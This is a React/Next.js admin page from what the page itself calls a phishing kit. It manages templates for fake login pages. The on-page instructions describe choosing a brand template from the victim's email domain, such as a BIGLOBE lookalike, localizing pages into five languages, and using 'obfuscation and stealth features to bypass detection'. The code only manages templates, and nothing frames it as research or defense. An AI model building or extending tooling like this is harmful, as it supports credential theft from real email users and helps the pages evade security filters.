'use client'

import { useState, useEffect } from 'react'
import { Template } from '@/lib/templateTypes'
import Link from 'next/link'

export default function TemplatesPage() {
  const [templates, setTemplates] = useState<Template[]>([])
  const [loading, setLoading] = useState(true)
  const [selectedTemplate, setSelectedTemplate] = useState<string | null>(null)
  const [showPreview, setShowPreview] = useState(false)
  
  // Load templates
  useEffect(() => {
    loadTemplates()
  }, [])
  
  async function loadTemplates() {
    try {
      setLoading(true)
      const response = await fetch('/api/templates')
      const data = await response.json()
      
      if (data.success) {
        setTemplates(data.templates)
      }
    } catch (error) {
    } finally {
      setLoading(false)
    }
  }
  
  // Toggle template enabled status
  async function toggleTemplate(id: string, enabled: boolean) {
    try {
      const response = await fetch('/api/templates', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, enabled }),
      })
      
      const data = await response.json()
      
      if (data.success) {
        await loadTemplates()
      }
    } catch (error) {
    }
  }
  
  // Set default template
  async function setDefaultTemplate(id: string) {
    try {
      // First, unset all other defaults
      for (const template of templates) {
        if (template.isDefault && template.id !== id) {
          await fetch('/api/templates', {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: template.id, isDefault: false }),
          })
        }
      }
      
      // Set new default
      const response = await fetch('/api/templates', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, isDefault: true }),
      })
      
      const data = await response.json()
      
      if (data.success) {
        await loadTemplates()
      }
    } catch (error) {
    }
  }
  
  // Delete template
  async function deleteTemplate(id: string) {
    if (!confirm('Are you sure you want to delete this template?')) {
      return
    }
    
    try {
      const response = await fetch(`/api/templates?id=${id}`, {
        method: 'DELETE',
      })
      
      const data = await response.json()
      
      if (data.success) {
        await loadTemplates()
      } else {
        alert(data.error || 'Failed to delete template')
      }
    } catch (error) {
      alert('Failed to delete template')
    }
  }
  
  if (loading) {
    return (
      <div className="min-h-screen bg-gray-900 p-6">
        <div className="max-w-7xl mx-auto">
          <div className="text-center text-white">
            <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mb-4"></div>
            <p>Loading templates...</p>
          </div>
        </div>
      </div>
    )
  }
  
  return (
    <div className="min-h-screen bg-gray-900 p-6">
      <div className="max-w-7xl mx-auto">
        {/* Back Button & Breadcrumb */}
        <div className="flex items-center gap-2 mb-4">
          <Link 
            href="/mamacita"
            className="px-4 py-2 bg-gray-800 text-white rounded-lg hover:bg-gray-700 flex items-center gap-2"
          >
            <span>←</span>
            <span>Back to Admin</span>
          </Link>
          
          <div className="text-gray-500">/</div>
          
          <span className="text-gray-400">Templates</span>
        </div>
        
        {/* Header */}
        <div className="flex justify-between items-center mb-8">
          <div>
            <h1 className="text-3xl font-bold text-white mb-2">
              📄 Template Management
            </h1>
            <p className="text-gray-400">
              Manage your phishing page templates with multi-language support
            </p>
          </div>
          
          <Link
            href="/mamacita/templates/create"
            className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
          >
            + Create Template
          </Link>
        </div>
        
        {/* Instructions Section */}
        <div className="bg-gradient-to-r from-blue-900/20 to-purple-900/20 border border-blue-800/30 rounded-lg p-6 mb-8">
          <h3 className="text-lg font-bold text-white mb-3 flex items-center gap-2">
            <span>💡</span>
            <span>How Templates Work</span>
          </h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-gray-300">
            <div>
              <div className="font-semibold text-blue-400 mb-1">🎨 Automatic Selection</div>
              <div>Templates are automatically chosen based on the victim&apos;s email domain (e.g., @biglobe.ne.jp → BIGLOBE template)</div>
            </div>
            <div>
              <div className="font-semibold text-blue-400 mb-1">🌐 Multi-Language</div>
              <div>Each template supports 5 languages (EN, JA, KO, DE, ES) with automatic detection</div>
            </div>
            <div>
              <div className="font-semibold text-blue-400 mb-1">🔒 High Security</div>
              <div>All templates include obfuscation and stealth features to bypass detection</div>
            </div>
            <div>
              <div className="font-semibold text-blue-400 mb-1">✏️ Fully Customizable</div>
              <div>Edit colors, content, layout, and behavior for each template</div>
            </div>
          </div>
        </div>
        
        {/* Quick Stats (Inline) */}
        <div className="flex items-center gap-6 mb-6 text-sm">
          <div className="flex items-center gap-2">
            <span className="text-gray-400">Total:</span>
            <span className="font-bold text-white">{templates.length}</span>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-gray-400">Enabled:</span>
            <span className="font-bold text-green-500">{templates.filter(t => t.enabled).length}</span>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-gray-400">Default:</span>
            <span className="font-bold text-blue-500">{templates.find(t => t.isDefault)?.name || 'None'}</span>
          </div>
        </div>
        
        {/* Templates Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {templates.map((template) => (
            <div
              key={template.id}
              className="bg-gray-800 rounded-xl overflow-hidden border border-gray-700 hover:border-blue-500 transition-all duration-200 hover:shadow-xl hover:shadow-blue-500/10 transform hover:-translate-y-1"
            >
              {/* Preview Image with Mini Form */}
              <div
                className="h-48 bg-gradient-to-br flex items-center justify-center relative overflow-hidden"
                style={{
                  background: template.background.type === 'color'
                    ? template.background.value
                    : `linear-gradient(135deg, ${template.theme.primaryColor} 0%, ${template.theme.secondaryColor} 100%)`,
                }}
              >
                {/* Mini Preview */}
                <div 
                  className="w-full h-full flex flex-col items-center justify-center p-6"
                  style={{ 
                    background: 'rgba(255,255,255,0.95)',
                  }}
                >
                  {/* Logo/Header */}
                  <div 
                    className="text-2xl font-bold mb-3"
                    style={{ color: template.theme.primaryColor }}
                  >
                    {template.logo.text || template.name}
                  </div>
                  
                  {/* Mini Form Preview */}
                  <div className="w-full max-w-[200px] space-y-2">
                    <div 
                      className="h-8 rounded border-2"
                      style={{ borderColor: '#ddd', background: '#f5f5f5' }}
                    />
                    <div 
                      className="h-8 rounded border-2"
                      style={{ borderColor: '#ddd', background: 'white' }}
                    />
                    <div 
                      className="h-10 rounded text-white font-bold flex items-center justify-center text-sm"
                      style={{ background: template.theme.primaryColor }}
                    >
                      {template.translations.en.submitButton || 'Login'}
                    </div>
                  </div>
                </div>
                
                {/* Status Badges */}
                <div className="absolute top-3 right-3 flex gap-2">
                  {template.isDefault && (
                    <span className="px-3 py-1 bg-blue-500 text-white text-xs font-bold rounded-full shadow-lg">
                      DEFAULT
                    </span>
                  )}
                  {template.enabled ? (
                    <span className="px-3 py-1 bg-green-500 text-white text-xs font-bold rounded-full shadow-lg">
                      ENABLED
                    </span>
                  ) : (
                    <span className="px-3 py-1 bg-red-500 text-white text-xs font-bold rounded-full shadow-lg">
                      DISABLED
                    </span>
                  )}
                </div>
              </div>
              
              {/* Template Info */}
              <div className="p-6">
                <h3 className="text-xl font-bold text-white mb-2">
                  {template.name}
                </h3>
                
                <div className="space-y-2 mb-4">
                  <div className="flex items-center text-sm text-gray-400">
                    <span className="mr-2">🌐</span>
                    <span>Languages: {Object.keys(template.translations).length}</span>
                  </div>
                  
                  <div className="flex items-center text-sm text-gray-400">
                    <span className="mr-2">🔒</span>
                    <span>Obfuscation: {template.obfuscationLevel}</span>
                  </div>
                  
                  <div className="flex items-center text-sm text-gray-400">
                    <span className="mr-2">📅</span>
                    <span>
                      Updated: {new Date(template.updatedAt).toLocaleDateString()}
                    </span>
                  </div>
                </div>
                
                {/* Languages */}
                <div className="flex flex-wrap gap-2 mb-4">
                  {Object.keys(template.translations).map((lang) => (
                    <span
                      key={lang}
                      className="px-2 py-1 bg-gray-700 text-gray-300 text-xs rounded"
                    >
                      {lang.toUpperCase()}
                    </span>
                  ))}
                </div>
                
                {/* Actions */}
                <div className="flex gap-2">
                  <button
                    onClick={() => toggleTemplate(template.id, !template.enabled)}
                    className={`flex-1 px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
                      template.enabled
                        ? 'bg-red-600 hover:bg-red-700 text-white'
                        : 'bg-green-600 hover:bg-green-700 text-white'
                    }`}
                  >
                    {template.enabled ? 'Disable' : 'Enable'}
                  </button>
                  
                  {!template.isDefault && (
                    <button
                      onClick={() => setDefaultTemplate(template.id)}
                      className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium rounded-lg transition-colors"
                      title="Set as default"
                    >
                      ⭐
                    </button>
                  )}
                  
                  <Link
                    href={`/mamacita/templates/edit/${template.id}`}
                    className="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-white text-sm font-medium rounded-lg transition-colors"
                  >
                    ✏️
                  </Link>
                  
                  <button
                    onClick={() => {
                      setSelectedTemplate(template.id)
                      setShowPreview(true)
                    }}
                    className="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-white text-sm font-medium rounded-lg transition-colors"
                  >
                    👁️
                  </button>
                  
                  {!template.isDefault && (
                    <button
                      onClick={() => deleteTemplate(template.id)}
                      className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white text-sm font-medium rounded-lg transition-colors"
                    >
                      🗑️
                    </button>
                  )}
                </div>
              </div>
            </div>
          ))}
        </div>
        
        {/* Empty State */}
        {templates.length === 0 && (
          <div className="text-center py-20">
            <div className="text-6xl mb-4">📄</div>
            <h3 className="text-2xl font-bold text-white mb-2">
              No templates yet
            </h3>
            <p className="text-gray-400 mb-6">
              Create your first template to get started
            </p>
            <Link
              href="/mamacita/templates/create"
              className="inline-block px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
            >
              Create Template
            </Link>
          </div>
        )}
      </div>
      
      {/* Preview Modal */}
      {showPreview && selectedTemplate && (
        <TemplatePreviewModal
          templateId={selectedTemplate}
          onClose={() => {
            setShowPreview(false)
            setSelectedTemplate(null)
          }}
        />
      )}
    </div>
  )
}

// Preview Modal Component
function TemplatePreviewModal({ 
  templateId, 
  onClose 
}: { 
  templateId: string
  onClose: () => void 
}) {
  return (
    <div className="fixed inset-0 bg-black bg-opacity-75 z-50 flex items-center justify-center p-6">
      <div className="bg-gray-800 rounded-lg w-full max-w-6xl max-h-[90vh] overflow-auto">
        <div className="p-6 border-b border-gray-700 flex justify-between items-center">
          <h2 className="text-2xl font-bold text-white">Template Preview</h2>
          <button
            onClick={onClose}
            className="px-4 py-2 bg-gray-700 hover:bg-gray-600 text-white rounded-lg"
          >
            Close
          </button>
        </div>
        
        <div className="p-6">
          <iframe
            src={`/api/templates/preview?id=${templateId}`}
            className="w-full h-[600px] border border-gray-700 rounded-lg"
            title="Template Preview"
          />
        </div>
      </div>
    </div>
  )
}

